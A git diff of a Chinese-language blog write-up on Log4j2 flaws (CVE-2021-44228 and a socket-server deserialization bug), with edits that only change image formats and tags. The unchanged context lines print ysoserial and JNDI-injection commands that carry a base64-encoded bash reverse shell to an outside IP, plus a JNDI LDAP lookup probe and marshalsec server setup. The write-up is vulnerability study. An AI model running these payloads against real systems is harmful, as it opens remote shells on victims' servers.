@@ -7,8 +7,7 @@ lastmod: "2025-10-11T20:11:27+08:00"
 image: ""
 license: ""
 categories: ["Javasec"]
-tags: [""]
-
+tags: ["Log4j2", "JNDI"]
 ---
 在P牛的学习文档的帮助下，走了一遍基础，现在准备看看危害（当时）极高的log4j漏洞，我一进去搜索就看到有些人说是log4j，又有些人说是log4j2，迷迷糊糊的，查了一下资料知道网上广泛讨论的Log4j漏洞（如CVE-2021-44228）实际上是指Log4j2的漏洞 ，而非旧的Log4j 1.x版本。
 
@@ -35,15 +34,15 @@ java -jar ysoserial-all.jar CommonsCollections5 "touch /tmp/baozongwi" | nc 154.
 java -jar ysoserial-all.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNTQuMzYuMTUyLjEwOS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}" | nc 154.36.152.109 4712
 ```
 
-![img](./assets/001.webp)
+![img](./assets/001.png)
 
-![img](./assets/002.webp)
+![img](./assets/002.png)
 
 ### CVE-2021-44228
 
 访问靶机8983端口
 
-![img](./assets/003.webp)
+![img](./assets/003.png)
 
 先进行DNS探测
 
@@ -51,7 +50,7 @@ java -jar ysoserial-all.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZ
 /solr/admin/cores?action=${jndi:ldap://zfvfqa2m.requestrepo.com}
 ```
 
-![img](./assets/004.webp)
+![img](./assets/004.png)
 
 探测成功，尝试反序列化
 
@@ -61,9 +60,9 @@ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "touch /tmp/baozongwi" 
 java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNTQuMzYuMTUyLjEwOS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}" -A "154.36.152.109"
 ```
 
-![img](./assets/005.webp)
+![img](./assets/005.png)
 
-![img](./assets/006.webp)
+![img](./assets/006.png)
 
 ## 漏洞分析
 
@@ -140,7 +139,7 @@ java -jar ysoserial-all.jar CommonsCollections5 "open -a Calculator" | nc localh
 
 成功，
 
-![img](./assets/007.webp)
+![img](./assets/007.png)
 
 现在来查看为什么会反序列化，看到代码主要就两个类，TcpSocketServer 和 ObjectInputStreamLogEventBridge，调试一下，跟进到`TcpSocketServer#run`
 
@@ -446,7 +445,7 @@ private int substitute(LogEvent event, StringBuilder buf, int offset, int length
 
 看着很复杂，总结一下，这个方法实际上就是`${jndi:xxx}`这类表达式 ，同时通过递归和状态管理解决嵌套变量的问题，可以一步步看表达式的处理，处理好之后看到 resolveVariable 之后被执行（DNS网站多了一个回显），跟进 resolveVariable
 
-![img](./assets/008.webp)
+![img](./assets/008.png)
 
 跟进之后再跟到 lookup
 
@@ -569,15 +568,15 @@ python3 -m http.server 8000
 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8000/#Eval"
 ```
 
-![img](./assets/009.webp)
+![img](./assets/009.png)
 
 对于这个版本发布了两个🍮，一个是 rc1 一个是 rc2，rc2是安全的，rc1存在绕过，简单说说，详细看引用的最后两篇文章，默认的配置的话，加载的类实例为`SimpleMessagePatternConverter`这个类只是简单的拼接Message信息，并不会去尝试解析`${`，所以根本不会有`lookup`操作。但是如果配置文件中指配置文件白名单设置允许 jndi 到指定地址的情况，就可以绕过
 
-![img](./assets/010.webp)
+![img](./assets/010.png)
 
 借用大佬的一步分析图
 
-![img](./assets/011.webp)
+![img](./assets/011.png)
 
 写几个可用poc
 
